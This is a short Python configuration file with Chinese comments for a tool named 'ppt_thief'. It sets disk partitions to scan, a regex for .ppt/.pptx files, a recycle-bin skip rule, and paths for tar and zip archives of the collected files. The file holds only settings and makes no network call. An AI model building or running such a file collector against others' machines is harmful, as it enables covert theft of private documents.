# 磁盘分区，方便检测
pc_disk_partitions = []

# ppt 所在位置
ppt_path = []

# 筛选条件
match_pattern = '.+\.(ppt|pptx)$'

# 跳过条件
skip_pattern = '($RECYCLE)'

# 存储路径
target_path = "./out/output"

# 打包路径
tar_path = "./out/ppt_thief.tar"

# 压缩路径
zip_path = "./out/ppt_thief.zip"